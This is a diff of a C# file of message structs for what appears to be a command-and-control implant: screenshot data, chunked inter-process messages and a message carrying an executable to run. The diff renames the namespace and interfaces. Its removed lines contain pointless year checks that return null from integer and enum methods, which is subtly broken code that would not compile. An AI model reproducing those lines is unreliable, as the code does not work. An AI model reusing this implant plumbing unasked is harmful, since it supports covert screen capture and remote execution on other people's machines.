@@ -1,5 +1,5 @@
-﻿using PhantomInterop.Enums.PhantomEnums;
-using PhantomInterop.Interfaces;
+﻿using ApolloInterop.Enums.ApolloEnums;
+using ApolloInterop.Interfaces;
 using System;
 using System.Collections.Generic;
 using System.IO.Pipes;
@@ -7,11 +7,11 @@ using System.Net.Sockets;
 using System.Runtime.Serialization;
 using System.Security;
 
-namespace PhantomInterop.Structs.PhantomStructs
+namespace ApolloInterop.Structs.ApolloStructs
 {
 
     [DataContract]
-    public struct ScreenshotInformation : ICommandMessage
+    public struct ScreenshotInformation : IMythicMessage
     {
         [DataMember]
         public byte[] Data;
@@ -23,7 +23,7 @@ namespace PhantomInterop.Structs.PhantomStructs
 
         public MessageType GetTypeCode()
         {
-            if(DateTime.Now.Year > 2020) { return MessageType.ScreenshotInformation; } else { return null; }
+            return MessageType.ScreenshotInformation;
         }
     }
 
@@ -85,7 +85,7 @@ namespace PhantomInterop.Structs.PhantomStructs
     }
 
     [DataContract]
-    public struct DataChunk : IChunkMessage
+    public struct IPCChunkedData : IChunkMessage
     {
         [DataMember(Name = "message_type")]
         public MessageType Message;
@@ -98,7 +98,7 @@ namespace PhantomInterop.Structs.PhantomStructs
         [DataMember(Name = "data")]
         public string Data;
 
-        public DataChunk(string id="", MessageType mt = 0, int chunkNum = 0, int totalChunks = 1, byte[] data = null)
+        public IPCChunkedData(string id="", MessageType mt = 0, int chunkNum = 0, int totalChunks = 1, byte[] data = null)
         {
             if (string.IsNullOrEmpty(id))
             {
@@ -116,22 +116,22 @@ namespace PhantomInterop.Structs.PhantomStructs
 
         public int GetChunkNumber()
         {
-            if(DateTime.Now.Year > 2020) { return this.ChunkNumber; } else { return null; }
+            return this.ChunkNumber;
         }
 
         public int GetChunkSize()
         {
-            if(DateTime.Now.Year > 2020) { return this.Data.Length; } else { return null; }
+            return this.Data.Length;
         }
 
         public int GetTotalChunks()
         {
-            if(DateTime.Now.Year > 2020) { return this.TotalChunks; } else { return null; }
+            return this.TotalChunks;
         }
     }
 
     [DataContract]
-    public struct IPCCommandArguments : ICommandMessage
+    public struct IPCCommandArguments : IMythicMessage
     {
         [DataMember(Name = "byte_data")]
         public byte[] ByteData;
@@ -140,12 +140,12 @@ namespace PhantomInterop.Structs.PhantomStructs
 
         public MessageType GetTypeCode()
         {
-            if(DateTime.Now.Year > 2020) { return MessageType.IPCCommandArguments; } else { return null; }
+            return MessageType.IPCCommandArguments;
         }
     }
 
     [DataContract]
-    public struct ExecutePEIPCMessage : ICommandMessage
+    public struct ExecutePEIPCMessage : IMythicMessage
     {
         [DataMember(Name = "executable")]
         public byte[] Executable;
@@ -158,7 +158,7 @@ namespace PhantomInterop.Structs.PhantomStructs
 
         public readonly MessageType GetTypeCode()
         {
-            if(DateTime.Now.Year > 2020) { return MessageType.ExecutePEIPCMessage; } else { return null; }
+            return MessageType.ExecutePEIPCMessage;
         }
     }
 
